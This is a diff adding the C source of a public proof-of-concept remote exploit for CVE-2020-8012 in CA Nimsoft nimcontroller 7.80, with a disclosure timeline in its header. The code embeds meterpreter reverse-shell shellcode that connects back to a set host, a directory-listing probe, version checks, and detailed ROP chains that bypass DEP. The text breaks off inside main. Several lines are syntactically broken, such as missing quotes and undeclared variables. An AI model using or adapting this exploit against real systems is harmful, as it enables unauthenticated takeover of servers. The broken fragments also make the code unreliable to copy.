@@ -1,0 +1,858 @@
+# Exploit Title: CA Unified Infrastructure Management Nimsoft 7.80 - Remote Buffer Overflow
+# Exploit Author: wetw0rk
+# Exploit Version: Public POC
+# Vendor Homepage: https://docops.ca.com/ca-unified-infrastructure-management/9-0-2/en
+# Software Version : 7.80
+# Tested on: Windows 10 Pro (x64), Windows Server 2012 R2 Standard (x64)
+# CVE: CVE-2020-8012   
+
+/************************************************************************************************************************** 
+ *                                                                                                                        *
+ * Description:                                                                                                           *
+ *                                                                                                                        *
+ *    Unauthenticated Nimbus nimcontroller RCE, tested against build 7.80.3132 although multiple versions are affected.   *
+ *    The exploit won't crash the service.                                                                                *
+ *                                                                                                                        *
+ *    You may have to run the exploit code multiple times on Windows Server 2012. If you exploit Windows Server 2019 it   *
+ *    should work as well just didn't get a chance to test it (reversing other things), I put faith in my ROP chain being *
+ *    universal (worked first try on 2012).                                                                               *
+ *                                                                                                                        *
+ * Note:                                                                                                                  *
+ *                                                                                                                        *
+ *     This is what it looks like, a fully remote stack based userland x64 exploit (NOT WOW64) and YES this did bypass    *
+ *     the stack cookie. WE OUT HERE!!!                                                                                   *
+ *                                                                                                                        *
+ * Compile:                                                                                                               *
+ *                                                                                                                        *
+ *    gcc poc_release.c -o singAboutMeImDyingOfThirst                                                                     *
+ *                                                                                                                        *
+ * Shoutout:                                                                                                              *
+ *                                                                                                                        *
+ *    Xx25, SneakyNachos, liquidsky, Itzik, r4g1n-cajun, FR13NDZ, Geluchat, ihack4falafel, cheshire_jack, the NSA         *
+ *    for dropping Ghidra, and my Mentor                                                                                  *
+ *                                                                                                                        *
+ * ----------------------------------------------- ReSpoNsIb1E Di$C10sUrE ----------------------------------------------- *
+ * 11/07/19 - Vendor contacted (POC code and POC video sent)                                                              *
+ * 11/15/19 - Vendor contacted for update, engineering team unable to reproduce bug                                       *
+ * 11/20/19 - Vendor cannot reproduce bug, call for a demo scheduled                                                      *
+ * 11/22/19 - Vendor rescheduled to Dec 3rd, claims (<ROAST REDACTED>...)                                                 *
+ * 12/03/19 - Vendor confirms exploitability and vulnerability presence                                                   *
+ * 12/13/19 - Vendor finalizing hotfix                                                                                    *
+ * 12/19/19 - Vendor hotfix tested against POC code                                                                       *
+ * 01/07/20 - Vendor contacted for update on patch and case status, followed up on 01/14/20                               *
+ * 01/21/20 - Vendor replies (awaiting more info)                                                                         *
+ * 01/27/20 - Vendor requests exploit code to release in late February to allow customers time to patch                   *
+ * 02/XX/20 - PoC sample dropped                                                                                          *
+ **************************************************************************************************************************/
+
+#include <stdio.h>
+#include <stdint.h>
+#include <ctype.h>
+#include <stdlib.h>
+#include <string.h>
+#include <getopt.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.159.157 LPORT=42 -f c */
+unsigned char shellcode[] = \
+"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
+"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
+"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
+"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1"
+"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
+"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
+"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
+"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
+"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
+"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
+"\x49\xbc\x02\x00\x00\x2a\xc0\xa8\x9f\x9d\x41\x54\x49\x89\xe4"
+"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
+"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
+"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
+"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
+"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
+"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"
+"\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
+"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
+"\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
+"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
+"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
+"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
+"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40"
+"\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5"
+"\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
+"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
+"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";
+
+const char *exploited[] = \
+{
+  "10.0.18362",
+  "6.3.9600",
+};
+
+const char *versions[]= \
+{
+  "7.80 [Build 7.80.3132, Jun  1 2015]",
+};
+
+/********************************************************************************************************************
+ *                                                                                                                  *
+ * NimsoftProbe:                                                                                                    *
+ *                                                                                                                  *
+ *    This is the structure used for the packet generator, it will be used specifically as the return type. Within  *
+ *    the structure there are 2 members, first the pointer to the packet and secondly the packet length.            *
+ *                                                                                                                  *
+ * NimsoftProbe *packet_gen(char *lparams[], int nparams, int exploit_buffer):                                      *
+ *                                                                                                                  *
+ *    This function will generate a nimbus probe, taken from nimpack (tool I developed while reverse engineering) a *
+ *    few modifications where made to handle the exploit buffer (mainly since it contains NULLS).                   *
+ *                                                                                                                  *
+ ********************************************************************************************************************/
+
+#define PHLEN 300   /* header      */
+#define PBLEN 2000  /* body        */
+#define PALEN 10000 /* argv        */
+#define FPLEN 20000 /* final probe */
+
+#define CLIENT "127.0.0.1/1337"
+
+#define INTSIZ(x) snprintf(NULL, 0, "%i", x)
+
+unsigned char packet_header[] = \
+"\x6e\x69\x6d\x62\x75\x73\x2f\x31\x2e\x30\x20%d\x20%d\x0d\x0a";
+unsigned char packet_body[] = \
+                                    /* nimbus header */
+"\x6d\x74\x79\x70\x65\x0F"          /* mtype         */
+"\x37\x0F\x34\x0F\x31\x30\x30\x0F"  /* 7.4.100       */
+"\x63\x6d\x64\x0F"                  /* cmd           */
+"\x37\x0F%d\x0F"                    /* 7.x           */
+"%s\x0F"                            /* probe         */
+"\x73\x65\x71\x0F"                  /* seq           */
+"\x31\x0F\x32\x0F\x30\x0F"          /* 1.2.0         */
+"\x74\x73\x0F"                      /* ts            */
+"\x31\x0F%d\x0F"                    /* 1.X           */
+"%d\x0F"                            /* UNIX EPOCH    */
+"\x66\x72\x6d\x0F"                  /* frm           */
+"\x37\x0F%d\x0F"                    /* 7.15          */
+"%s\x0F"                            /* client addr   */
+"\x74\x6f\x75\x74\x0F"              /* tout          */
+"\x31\x0F\x34\x0F\x31\x38\x30\x0F"  /* 1.4.180       */
+"\x61\x64\x64\x72\x0F"              /* addr          */
+"\x37\x0F\x30\x0F";                 /* 7.0           */
+
+typedef struct {
+  char *packet;
+  int length;
+} NimsoftProbe;
+
+NimsoftProbe *packet_gen(char *lparams[], int nparams, int exploit_buffer)
+{
+  int index = 0;
+  int fmt_args;
+  int lbody = 0;
+  int largs = 0;
+  char *tptr;
+  char pheader[PHLEN];
+  char pbody[PBLEN];
+  char pargs[PALEN];
+  char pbuffer[FPLEN];
+  char temp_buffer[80];
+  char *probe = lparams[0];
+
+  int epoch_time = (int)time(NULL);
+
+  NimsoftProbe *probePtr = (NimsoftProbe*)malloc(sizeof(NimsoftProbe));
+
+  fmt_args = snprintf(NULL, 0, "%d%s%d%d%d%s",
+    (strlen(probe)+1),
+    probe,
+    (INTSIZ(epoch_time)+1),
+    epoch_time,
+    (strlen(CLIENT)+1),
+    CLIENT
+  );
+
+  if ((fmt_args + sizeof(packet_body)) > PBLEN) {
+    printf("Failed to generate packet body\n");
+    exit(-1);
+  }
+
+  lbody = snprintf(pbody, PBLEN, packet_body,
+    (strlen(probe)+1),
+    probe,
+    (INTSIZ(epoch_time)+1),
+    epoch_time,
+    (strlen(CLIENT)+1),
+    CLIENT
+  );
+
+  for (i = 1; i < nparams; i++)
+  {
+    memset(temp_buffer, '\0', 80);
+
+    for (j = 0; j < strlen(lparams[i]); j++)
+    {
+      if ((c = lparams[i][j]) == '=')
+      {
+        memcpy(temp_buffer, lparams[i], j);
+        index = ++j;
+        break;
+      }
+    }
+
+    tptr = lparams[i];
+
+    if ((c = 1, c += strlen(temp_buffer)) < PALEN) {
+      largs += snprintf(pargs+largs, c, "%s", temp_buffer);
+      largs++;
+    } else {
+      printf("Failed to generate packet arguments\n");
+      exit(-1);
+    }
+
+    if (index > 0 && exploit_buffer == 0)
+    {
+      tptr = tptr+index;
+
+      if ((largs + strlen(tptr) + 2) < PALEN)
+      {
+        largs += snprintf(pargs+largs, 2, "%s", "1");
+        largs++;
+
+        largs += snprintf(pargs+largs, strlen(tptr)+1, "%d", strlen(tptr)+1);
+        largs++;
+      } else {
+        printf("Failed to generate packet arguments\n");
+        exit(-1);
+      }
+
+      c = 1, c += strlen(tptr);
+      if ((largs + c) < PALEN)
+      {
+        largs += snprintf(pargs+largs, c, "%s", tptr);
+        largs++;
+      } else {
+        printf("Failed to generate packet arguments\n");
+        exit(-1);
+      }
+    }
+
+    if (index > 0 && exploit_buffer > 0)
+    {
+      tptr = tptr+index;
+
+      if ((largs + exploit_buffer + 2) < PALEN)
+      {
+        largs += snprintf(pargs+largs, 2, "%s", "1");
+        largs++;
+
+        largs += snprintf(pargs+largs, 5, %d", exploit_buffer+1);
+        largs++;
+      } else {
+        printf("Failed to generate packet arguments\n");
+        exit(-1);
+      }
+
+      c = 1, c += exploit_buffer;
+
+      if ((largs + c) < PALEN)
+      {
+        memcpy(pargs+largs, tptr, c);
+        largs += exploit_buffer;
+        largs++;
+      } else {
+        printf("Failed to generate packet arguments\n");
+        exit(-1);
+      }
+    }
+  }
+
+  index = snprintf(pbuffer, FPLEN, packet_header, lbody, largs);
+  index += lbody;
+
+  if (index < FPLEN) {
+    strncat(pbuffer, pbody, lbody);
+  } else {
+    printf("Failed to concatenate packet body\n");
+    exit(-1);
+  }
+
+  for (i = 0; i < index; i++)
+    if (pbuffer[i] == '\x0f')
+      pbuffer[i] = '\x00';
+
+  if ((index + largs) < FPLEN) {
+    for (i = 0; i < largs; i++)
+      pbuffer[index++] = pargs[i];
+  }
+  else {
+    printf "Failed to concatenate packet arguments\n");
+    exit(-1);
+  }
+
+  probePtr->packet = pbuffer;
+  probePtr->length = index;
+
+  return probePtr;
+}
+
+/*********************************************************************************************************************
+ *                                                                                                                   *
+ * int parse_directory(char *response, int length):                                                                  *
+ *                                                                                                                   *
+ *    This function will parse the directory contents, specifically looking for the entry keyword;  if found, we can *
+ *    proceed with exploitation.                                                                                     *
+ *                                                                                                                   *
+ * int check_vulnerability(char *rhost, int rport):                                                                  *
+ *                                                                                                                   *
+ *    This function will send a Nimbus probe to the target controller, specifically the directory_list probe. Once   *
+ *    sent the returned packet will be parsed by parse_directory.                                                    *
+ *                                                                                                                   *
+ *********************************************************************************************************************/
+
+#define PE "(\033[1m\033[31m-\033[0m)"
+#define PI "(\033[1m\033[94m*\033[0m)"
+#define PG "(\033[1m\033[92m+\033[0m)"
+
+int parse_directory(char *response, int length)
+{
+  int i;
+  int backup;
+  int check = 0;
+  int index = 0;
+
+  char buf[80];
+  struct tm ts;
+  time_t capture;
+
+  if (strncmp(response, "nimbus/1.0", 10) != 0)
+    return -1;
+
+  while (index < length)
+  {
+    if (strcmp("entry", (response+index)) == 0)
+      printf("%s Persistence is an art\n\n", PG);
+
+    if (strcmp("name", (response+index)) == 0) {
+      backup = index;
+      check = 1;
+
+      /* last modified */
+      for (int i = 0; i < 15; i++)
+        index += strlen(response+index) + 1;
+      capture = atoi(response+index);
+      ts = *localtime(&capture);
+      strftime(buf, sizeof(buf), "%m/%d/%Y %I:%M %p", &ts);
+      printf("%12s ", buf);
+      index = backup;
+
+      /* type */
+      for (int i = 0; i < 7; i++)
+        index += strlen(response+index) + 1;
+      if (strcmp("2", (response+index)) == 0)
+        printf("%7s", " ");
+      else
+        printf("%-7s", "<DIR>");
+      index = backup;
+      /* name */
+      for (int i = 0; i < 3; i++)
+        index += strlen(response+index) + 1;
+      printf("%s\n", response+index);
+    }
+    index += strlen(response+index) + 1;
+  }
+
+  return (check != 1) ? -1 : 0;
+}
+
+int check_vulnerability(char *rhost, int rport)
+{
+  int c;
+  int sock;
+  int count;
+
+  NimsoftProbe *probe;
+  char response[BUFSIZ];
+  struct sockaddr_in srv;
+  char *get_directory_listing[] = { "directory_list", "directory=C:\\", "detail=1" };
+
+  probe = packet_gen(get_directory_listing, 3, 0);
+
+  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    return -1;
+
+  srv.sin_addr.s_addr = inet_addr(rhost);
+  srv.sin_port = htons(rport);
+  srv.sin_family = AF_INET;
+
+  if (connect(sock , (struct sockaddr *)&srv, sizeof(srv)) < 0)
+    return -1;
+  printf("%s Verifying vulnerable probe is reachable\n", PI);
+
+  send(sock, probe->packet, probe->length, 0);
+  count = read(sock, response, BUFSIZ);
+
+  if (parse_directory(response, count) == 0)
+    printf("\n%s Target ready for exploitation\n", PG);
+  else
+    return -1;
+
+  free(probe);
+  close(sock);
+
+  return 0;
+}
+
+/********************************************************************************************************************
+ *                                                                                                                  *
+ * char *nimdex(char *haystack, char *needle, int size):                                                            *
+ *                                                                                                                  *
+ *    This function works similar to strstr, however it was specifically made to index "keys" to their respective   *
+ *    "values" within a Nimbus packet. It has only been tested against the get_info packet.                         *
+ *                                                                                                                  *
+ * int parse_response(char *response, int length):                                                                  *
+ *                                                                                                                  *
+ *    This function leverages nimdex to perform 2 checks. The first check will verify the target operating system   *
+ *    has been exploited, the second check will verify the Nimbus controller version is exploitable (or rather has  *
+ *    a ROP chain ready). In order for exploitation to succeed only the second check needs to pass, I have faith in *
+ *    my ROP chain being universal.                                                                                 *
+ *                                                                                                                  *
+ * int check_version(char *rhost, int rport):                                                                       *
+ *                                                                                                                  *
+ *    This function will send a Nimbus probe to the target controller, specifically the get_info probe. Once sent   *
+ *    the returned packet will be parsed by parse_response.                                                         *
+ *                                                                                                                  *
+ ********************************************************************************************************************/
+
+char *nimdex(char *haystack, char *needle, int size)
+{
+  int found = 0;
+  int index = 0;
+
+  if (strncmp(haystack, "nimbus/1.0", 10) != 0)
+    return NULL;
+
+  while (index < size)
+  {
+    if (strcmp(needle, (haystack+index)) == 0)
+      found = 2;
+    else if (found >= 2)
+      found++;
+    if (found == 5)
+      return &haystack[index];
+    index += strlen(haystack+index) + 1;
+  }
+  return NULL;
+}
+
+int parse_response(char *response, int length)
+{
+  int i;
+  int c;
+  char *ptr;
+  int check = 0;
+  int nv = sizeof(versions)/sizeof(versions[0]);
+  int ne = sizeof(exploited)/sizeof(exploited[0]);
+
+  if ((ptr = nimdex(response, "os_minor", length)) == NULL)
+    return -1;
+  printf("%s Probe successful, detected: %s\n", PI, ptr);
+
+  if ((ptr = nimdex(response, "os_version", length)) == NULL)
+    return -1;
+
+  for (i = 0; i < ne; i++)
+    if ((strcmp(exploited[i], ptr)) == 0)
+      check = 1;
+
+  if (check != 1)
+  {
+    printf("%s Exploit has not been tested against OS version\n", PE);
+    printf("%s Continute exploitation (Y/N): ", PE);
+
+    c = getchar();
+    if (tolower(c) != 'y')
+      exit(-1);
+
+    printf("%s If exploitation successful, update code!!!\n", PI);
+    if ((ptr = nimdex(response, "os_version", length)) == NULL)
+      return -1;
+    printf("%s Target OS ID: %s\n", PI, ptr);
+  }
+  else
+    printf("%s Target OS appears to be exploitable\n", PI);
+
+  check = 0;
+
+  if ((ptr = nimdex(response, "version", length)) == NULL)
+    return -1;
+
+  for (i = 0; i < nv; i++)
+    if ((strcmp(versions[i], ptr)) == 0)
+      check = 1;
+
+  if (check != 1) {
+    printf("%s Exploit has not been tested against target build\n", PE);
+    exit(-1);
+  } else
+    printf("%s Nimbus build appears to be exploitable\n", PI);
+
+  return 0;
+}
+
+int check_version(char *rhost, int rport)
+{
+  int c;
+  int sock;
+  int count;
+  NimsoftProbe *probe;
+  char response[BUFSIZ];
+  struct sockaddr_in srv;
+  char *get_operating_sys[] = { "get_info", "interfaces=0" };
+
+  probe = packet_gen(get_operating_sys, 2, 0);
+
+  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    return -1;
+
+  srv.sin_addr.s_addr = inet_addr(rhost);
+  srv.sin_port = htons(rport);
+  srv.sin_family = AF_INET;
+
+  if (connect(sock , (struct sockaddr *)&srv, sizeof(srv)) < 0)
+    return -1;
+
+  printf("%s Sending get_info probe to %s:%d\n", PI, rhost, rport);
+
+  send(sock, probe->packet, probe->length, 0);
+  count = read(sock, response, BUFSIZ);
+
+  if ((parse_response(response, count) != 0)) {
+    printf("%s Probe failed, unable to parse packet\n", PE);
+    exit(-1);
+  }
+
+  free(probe);
+  close(sock);
+
+  return 0;
+}
+
+/*****************************************************************************************************************
+ * This chain will re-align RSP / Stack, it MUST be a multiple of 16 bytes otherwise our call will fail.         *
+ * I had VP work 50% of the time when the stack was unaligned.                                                   *
+ *****************************************************************************************************************/
+int64_t rsp_alignment_rop_gadgets[] = {
+
+[0 ... 19]    = 0x0000000140018c42, // ret (20 ROP NOPS)
+                0x0000000140002ef6, // pop rax ; ret
+                0x00000001401a3000, // *ptr to handle reference ( MEM_COMMIT | PAGE_READWRITE | MEM_IMAGE )
+                0x00000001400af237, // pop rdi ; ret
+                0x0000000000000007, // alignment for rsp
+                0x0000000140025dab, // add esp, edi ; adc byte [rax], al ; add rsp, 0x0000000000000278 ; ret
+};
+
+/*****************************************************************************************************************
+ * This chain will craft function calls to GetModuleHandleA, GetProcAddressStub, and finally VirtualProtectStub. *
+ * Once completed, we have bypassed DEP and can get code execution. Since VirtualProtectStub is auto generated,  *
+ * we needn't worry about other Windows OS's.                                                                    *
+ *****************************************************************************************************************/
+int64_t dep_bypass_rop_gadgets[] = {
+
+// RAX -> HMODULE GetModuleHandleA(
+//  ( RCX == *module ) LPCSTR lpModuleName,
+// );
+[0 ... 14]    = 0x0000000140018c42, // ret (15 ROP NOPS)
+                0x0000000140002ef6, // pop rax ; ret
+                0x0000000000000000, // (zero out rax)
+                0x00000001400eade1, // mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+[24 ... 33]   = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x0000000140131643, // pop rcx ; ret
+                0x00000000000009dd, // offset to "kernel32.dll"
+                0x000000014006d8d8, // add rax, rcx ; add rsp, 0x38 ; ret
+[37 ... 51] =   0x0000000140018c42, // ret (15 ROP NOPS)
+                0x00000001400b741b, // xchg eax, ecx ; ret
+                0x0000000140002ef6, // pop rax ; ret
+                0x000000014015e310, // GetModuleHandleA (0x00000000014015E330-20)
+                0x00000001400d1161, // call qword ptr [rax+20] ; add rsp, 0x40 ; pop rbx ; ret
+[56 ... 72] =   0x0000000140018c42, // ret (17 ROP NOPS)
+
+// RAX -> FARPROC GetProcAddressStub(
+//   ( RCX == &addr    ) HMODULE hModule,
+//   ( RDX == *module  ) lpProcName
+// );
+                0x0000000140111c09, // xchg rax, r11 ; or al, 0x00 ; ret (backup &hModule)
+                0x0000000140002ef6, // pop rax ; ret
+                0x0000000000000000, // (zero out rax)
+                0x00000001400eade1, // mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+[83 ... 92]   = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x0000000140131643, // pop rcx ; ret
+                0x0000000000000812, // offset to "virtualprotectstub"
+                0x000000014006d8d8, // add rax, rcx ; add rsp, 0x38 ; ret
+[96 ... 110]  = 0x0000000140018c42, // ret (15 ROP NOPS)
+                0x0000000140135e39, // mov edx,eax ; mov rbx,qword [rsp+0x30] ; mov rbp,qword [rsp+0x38] ; mov rsi,qword [rsp+0x40] ; mov rdi,qword [rsp+0x48] ; mov eax,edx ; add rsp,0x20 ; pop r12; ret
+[112 ... 121] = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x00000001400d1ab8, // mov rax, r11 ; add rsp, 0x30 ; pop rdi ; ret
+[123 ... 132] = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x0000000140111ca1, // xchg rax, r13 ; or al, 0x00 ; ret
+                0x00000001400cf3d5, // mov rcx, r13 ; mov r13, qword [rsp+0x50] ; shr rsi, cl ; mov rax, rsi ; add rsp, 0x20 ; pop rdi ; pop rsi ; pop rbp ; ret
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+[138 ... 143] = 0x0000000140018c42, // ret
+                0x0000000140002ef6, // pop rax ; ret
+                0x000000014015e318, // GetProcAddressStub (0x00000000014015e338-20)
+                0x00000001400d1161, // call qword ptr [rax+20] ; add rsp, 0x40 ; pop rbx ; ret
+[147 ... 163] = 0x0000000140018c42, // ret (17 ROP NOPS)
+
+// RAX -> BOOL VirtualProtectStub(
+//   ( RCX == *shellcode          ) LPVOID  lpAddress,
+//   ( RDX == len(shellcode)      ) SIZE_T  dwSize,
+//   ( R8  == 0x0000000000000040  ) DWORD   flNewProtect,
+//   ( R9  == *writeable location ) PDWORD  lpflOldProtect,
+// );
+                0x0000000140111c09, // xchg rax, r11 ; or al, 0x00 ; ret (backup *VirtualProtectStub)
+                0x000000014013d651, // pop r12 ; ret
+                0x00000001401fb000, // *writeable location ( MEM_COMMIT | PAGE_READWRITE | MEM_IMAGE )
+                0x00000001400eba74, // or r9, r12 ; mov rax, r9 ; mov rbx, qword [rsp+0x50] ; mov rbp, qword [rsp+0x58] ; add rsp, 0x20 ; pop r12 ; pop rdi ; pop rsi ; ret
+[168 ... 177] = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x0000000140002ef6, // pop rax ; ret
+                0x0000000000000000, //
+                0x00000001400eade1, // mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+[187 ... 196] = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x0000000140131643, // pop rcx ; ret
+                0x000000000000059f, // (offset to *shellcode)
+                0x000000014006d8d8, // add rax, rcx ; add rsp, 0x38 ; ret
+[200 ... 214] = 0x0000000140018c42, // ret (15 ROP NOPS)
+                0x00000001400b741b, // xchg eax, ecx ; ret
+                0x00000001400496a2, // pop rdx ; ret
+                0x00000000000005dc, // dwSize
+                0x00000001400bc39c, // pop r8 ; ret
+                0x0000000000000040, // flNewProtect
+                0x00000001400c5f8a, // mov rax, r11 ; add rsp, 0x38 ; ret (RESTORE VirtualProtectStub)
+[221 ... 237] = 0x0000000140018c42, // ret (17 ROP NOPS)
+                0x00000001400a0b55, // call rax ; mov rdp qword ptr [rsp+48h] ; mov rsi, qword ptr [rsp+50h] ; mov rax, rbx ; mov rbx, qword ptr [rsp + 40h] ; add rsp,30h ; pop rdi ; ret
+[239 ... 258] = 0x0000000140018c42, // ret (20 ROP NOPS)
+                0x0000000140002ef6, // pop rax ; ret (CALL COMPLETE, "JUMP" INTO OUR SHELLCODE)
+                0x0000000000000000, // (zero out rax)
+                0x00000001400eade1, // mov eax, esp ; add rsp, 0x30 ; pop r13 ; pop r12 ; pop rbp ; ret
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+                0x0000000000000000, //
+[268 ... 277] = 0x0000000140018c42, // ret (10 ROP NOPS)
+                0x0000000140131643, // pop rcx ; ret
+                0x0000000000000317, // (offset to our shellcode)
+                0x000000014006d8d8, // add rax, rcx ; add rsp, 0x38 ; ret
+[281 ... 295] = 0x0000000140018c42, // ret (15 ROP NOPS)
+                0x00000001400a9747, // jmp rax
+[297 ... 316] = 0x0000000140018c42, // ret (do not remove)
+};
+
+/********************************************************************************************************************
+ *                                                                                                                  *
+ * int generate_rop_chain(unsigned char *buffer, int gadgets, int64_t rop_gadgets[]):                               *
+ *                                                                                                                  *
+ *    This function will generate a rop chain and store it in the buffer passed as the first argument. The return   *
+ *    value will contain the final ROP chain size.                                                                  *
+ *                                                                                                                  *
+ ********************************************************************************************************************/
+
+#define RSP_ROP (sizeof(rsp_alignment_rop_gadgets)/sizeof(int64_t))
+#define DEP_ROP (sizeof(dep_bypass_rop_gadgets) / sizeof(int64_t))
+
+int generate_rop_chain(unsigned char *buffer, int gadgets, int64_t rop_gadgets[])
+{
+  int i, j, k;
+  int chain_size = 0;
+
+  for (i = 0; i < gadgets; i++)
+    for (j = 0, k = 0; j < sizeof(rop_gadgets[i]); j++)
+    {
+      *buffer++ = ((rop_gadgets[i]>>k)&0xff);
+      chain_size++;
+      k += 8;
+    }
+
+  return chain_size;
+}
+
+#define MAX_EXPLOIT_BUFFER 9000
+
+unsigned char *generate_exploit_buffer(unsigned char *buffer)
+{
+  int r1, r2, c;
+  char rop_chain[20000];
+  unsigned char *heapflip = "\x3d\xfd\x06\x40\x01\x00\x00\x00";
+
+  memset(buffer     , 0x41, 1000);  // Offset
+  memset(buffer+1000, 0x0F, 33);
+  memcpy(buffer+1033, heapflip, 8); // HeapFlip - pop rsp ; or al, 0x00 ; add rsp, 0x0000000000000448 ; ret
+  memset(buffer+1041, 0x41, 7);     // Adjustment for the initial chain
+
+  /* generate the first rop chain to perform stack alignment */
+  r1 = generate_rop_chain(rop_chain, RSP_ROP, rsp_alignment_rop_gadgets);
+  memcpy(buffer+1048, rop_chain, r1);
+  c = r1 + 1048;
+
+  /* adjust for second stage */
+  memset(buffer+c, 0x57, 631);
+  c += 631;
+
+  /* generate the second rop chain to perform DEP bypass */
+  r2 = generate_rop_chain(rop_chain, DEP_ROP, dep_bypass_rop_gadgets);
+  memcpy(buffer+c, rop_chain, r2);
+  c += r2;
+
+  /* ROP CHAIN MUST BE 3500 BYTES OR EXPLOITATION WILL FAIL */
+  memset(buffer+c, 0x45, (3500 - (r1 + r2 + 631)));
+  c += (3500 - (r1 + r2 + 631));
+
+  memcpy(buffer+c, "kernel32.dll\x00", 13);
+  c += 13;
+
+  memcpy(buffer+c, "VirtualProtect\x00", 15);
+  c += 15;
+
+  /* NOPS */
+  memset(buffer+c, 0x90, 500);
+  c += 500;
+
+  /* shellcode */
+  memcpy(buffer+c, shellcode, (sizeof(shellcode)-1));
+  c += (sizeof(shellcode)-1);
+
+  /* filler */
+  memset(buffer+c, 0x10, (8000 - c));
+
+  return buffer;
+}
+
+#define MAX_ARGUMENTS 5
+
+void help()
+{
+  printf("usage: ./singAboutMeImDyingOfThirst [-h] [-t TARGET] [-p PORT] [ARG=VAL]\n\n");
+  printf("Sing About Me Im Dying Of Thirst - A nimcontroller's worst nightmare\n\n");
+  printf("optional arguments:\n");
+  printf("  -h, --help                  show this help message and exit\n");
+  printf("  -t TARGET, --target TARGET  target host to probe\n");
+  printf("  -p PORT, --port PORT        nimcontroller port\n\n");
+  printf("examples:\n");
+  printf("  ./singAboutMeImDyingOfThirst -t 192.168.88.130 -p 48000\n");
+  exit(0);
+}
+
+int main(int argc, char **argv)
+{
+  int c;
+  int sock;
+  int rport;
+  NimsoftProbe *probe;
+  struct sockaddr_in srv;
+  char *rhost, *port;
+  char *params[MAX_ARGUMENTS];
+  unsigned char *exploit_buff;
+  unsigned char buffer[MAX_EXPLOIT_BUFFER];
+  unsigned char final_buffer[MAX_EXPLOIT_BUFFER] = "directory=";
+
+  char *exploit[] = { "directory_list", final_buffer };
+
+  while (1)
+  {
